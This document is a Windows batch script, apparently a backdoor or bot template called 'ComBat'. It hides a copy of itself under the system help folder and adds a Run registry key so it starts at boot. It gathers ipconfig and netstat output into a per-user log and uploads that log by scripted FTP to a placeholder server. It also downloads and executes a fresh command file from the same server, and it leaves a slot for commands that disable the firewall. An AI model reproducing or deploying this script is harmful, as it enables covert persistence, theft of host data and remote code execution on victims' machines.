@ECHO OFF
:ComBat
DEL /F /Q "%SystemRoot%\help\combat\com.bat" >NUL
IF EXIST "%SystemRoot%\help\combat\server.bat" GOTO LOG
MKDIR "%SystemRoot%\help\combat\"
> "%SystemRoot%\help\combat\com.bat" ECHO @ECHO OFF
>>"%SystemRoot%\help\combat\com.bat" ECHO MOVE /Y %0 "%SystemRoot%\help\combat\"
>>"%SystemRoot%\help\combat\com.bat" ECHO CALL "%SystemRoot%\help\combat\server.bat"
GOTO RUN

:LOG
DEL /F /Q "%SystemRoot%\help\combat\%USERNAME%.log" >NUL
> "%SystemRoot%\help\combat\%USERNAME%.log" ECHO Server Log:
>> "%SystemRoot%\help\combat\%USERNAME%.log" ECHO.

:PATH
PATH|FIND "WINDOWS" >NUL
IF NOT ERRORLEVEL 1 SET WINDIR=WINDOWS
PATH|FIND "SYSTEM" >NUL
IF NOT ERRORLEVEL 1 SET SYSDIR=SYSTEM
PATH|FIND "WINNT" >NUL
IF NOT ERRORLEVEL 1 SET WINDIR=WINNT
PATH|FIND "SYSTEM32" >NUL
IF NOT ERRORLEVEL 1 SET SYSDIR=SYSTEM32

:FINDOS
VER|FIND "XP">NUL|SET OSV=XP
IF NOT ERRORLEVEL 1 GOTO WinXP
VER|FIND "2000">NUL|SET OSV=2K
IF NOT ERRORLEVEL 1 GOTO WinXP
VER|FIND "NT">NUL|SET OSV=NT
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "Mil">NUL|SET OSV=ME
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "98">NUL|SET OSV=98
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "95">NUL|SET OSV=95
IF NOT ERRORLEVEL 1 GOTO Win9X
GOTO END

:WinXP
> "%SystemRoot%\help\combat\regpatch.reg" ECHO Windows Registry Editor Version 5.00
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemDrive%\\%WINDIR%\\help\\combat\\server.bat"
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
GOTO ADD

:Win9X
> "%SystemRoot%\help\combat\regpatch.reg" ECHO REGEDIT4
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemDrive%\\%WINDIR%\\help\\combat\\server.bat"
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
GOTO ADD

:ADD
IF NOT EXIST "%SystemRoot%\help\combat\regpatch.reg" GOTO PATH
REGEDIT /S "%SystemRoot%\help\combat\regpatch.reg"
DEL /F /S /Q "%SystemRoot%\help\combat\regpatch.reg" >NUL

:KillFW
:: add Firewall killing NET STOP commands here.

:PING
PING (ftp server) -n 4 -w 1000 >NUL
IF ERRORLEVEL 1 GOTO PING

:STATS
IF NOT EXIST "%SystemRoot%\help\combat\%USERNAME%.log" GOTO LOG
IPCONFIG /all >> "%SystemRoot%\help\combat\%USERNAME%.log"
NETSTAT -a -n >> "%SystemRoot%\help\combat\%USERNAME%.log"

:COM
> "%SystemRoot%\help\combat\com.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp passwprd)
>>"%SystemRoot%\help\combat\com.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\com.txt" ECHO prompt
>>"%SystemRoot%\help\combat\com.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\com.txt" ECHO get "com.bat" "%SystemRoot%\help\combat\com.bat"
>>"%SystemRoot%\help\combat\com.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%.log"
>>"%SystemRoot%\help\combat\com.txt" ECHO bye

:FTP
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO COM
FTP -s:"%SystemRoot%\help\combat\com.txt" >NUL
DEL /F /Q "%SystemRoot%\help\combat\com.txt" >NUL

:RUN
CALL "%SystemRoot%\help\combat\com.bat"

:END
EXIT